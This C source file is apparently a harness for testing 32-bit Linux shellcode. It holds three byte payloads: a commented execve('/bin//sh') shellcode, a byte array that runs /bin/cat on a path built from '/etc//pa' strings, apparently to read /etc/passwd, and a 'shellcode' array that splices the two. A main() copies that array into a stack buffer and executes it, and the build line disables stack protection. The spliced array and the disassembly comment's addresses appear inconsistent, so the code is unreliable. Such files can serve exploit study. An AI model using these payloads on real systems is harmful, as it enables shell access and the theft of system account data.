// gcc -z execstack -o opcode ../shell_opcode.c
#include <string.h>

// char shellcode[] = "\x31\xd2"             // xor    %edx,%edx
//                    "\x52"                 // push   %edx
//                    "\x68\x6e\x2f\x73\x68" // push   $0x68732f6e
//                    "\x68\x2f\x2f\x62\x69" // push   $0x69622f2f
//                    "\x89\xe3"             // mov    %esp,%ebx
//                    "\x52"                 // push   %edx
//                    "\x53"                 // push   %ebx
//                    "\x89\xe1"             // mov    %esp,%ecx
//                    "\x8d\x42\x0b"         // lea    0xb(%edx),%eax
//                    "\xcd\x80";            // int    $0x80

unsigned char opcodes[] = {
    0x31, 0xd2, 0x52, 0x68, 0x2f, 0x2f, 0x70, 0x61, 0x68, 0x2f,
    0x65, 0x74, 0x63, 0x89, 0xe6, 0x52, 0x68, 0x2f, 0x63, 0x61,
    0x74, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0x56,
    0x53, 0x89, 0xe1, 0x8d, 0x42, 0x0b, 0xcd, 0x80,
};

char shellcode[] = {0x31, 0xd2, 0x52, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f,
                    0x2f, 0x62, 0x69, 0x89, 0xe3, 0x52, 0x68, 0x2f, 0x63, 0x61,
                    0x74, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0x56,
                    0x53, 0x89, 0xe1, 0x8d, 0x42, 0x0b, 0xcd, 0x80};

/*
08048400 <foo>:
80483b4:	55                   	push   %ebp
 80483b5:	89 e5                	mov    %esp,%ebp

 80483b7:	31 d2                	xor    %edx,%edx
 80483b9:	52                   	push   %edx
 80483ba:	68 6e 2f 73 68       	push   $0x68732f6e
 80483bf:	68 2f 2f 62 69       	push   $0x69622f2f
 80483c4:	89 e3                	mov    %esp,%ebx
 80483c6:	52                   	push   %edx
 80483c7:	53                   	push   %ebx
 80483c8:	89 e1                	mov    %esp,%ecx
 80483ca:	8d 42 0b             	lea    0xb(%edx),%eax
 80483cd:	cd 80                	int    $0x80

 80483cf:	5d                   	pop    %ebp
 80483d0:	c3                   	ret
*/

void main() {
  char attackStr[512];
  strcpy(attackStr, shellcode);
  ((void (*)())attackStr)();
}
